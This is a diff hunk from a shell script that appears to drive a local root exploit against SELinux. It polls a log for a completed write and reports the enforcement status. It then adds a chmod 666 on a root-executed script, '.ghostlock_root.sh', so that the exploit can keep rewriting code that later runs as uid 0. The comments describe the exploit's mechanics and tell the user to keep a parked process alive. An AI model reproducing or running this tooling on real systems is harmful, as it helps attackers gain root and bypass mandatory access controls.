@@ -92,6 +92,11 @@ while [ $i -lt 90 ]; do                # 90 * 1s, the store takes ~11s
     fi
     if grep -q "Write 1 complete" "$LOG" 2>/dev/null; then
         echo "W1: LANDED -- enforce=$(getenforce) ($(cat /sys/fs/selinux/enforce 2>/dev/null))"
+        # The exploit rewrote .ghostlock_root.sh as this uid on start (umask leaves
+        # it 0755), and the W1c process runs as uid 0 *without* capabilities: chmod
+        # needs ownership, which only this side has.  Without this the next uid-0
+        # run gets EACCES on its own root script and silently keeps the stale copy.
+        chmod 666 "$DIR/.ghostlock_root.sh" 2>/dev/null
         echo "W1: parked process is pid=$PID; do NOT kill it (a reboot is the clean exit)"
         exit 0
     fi
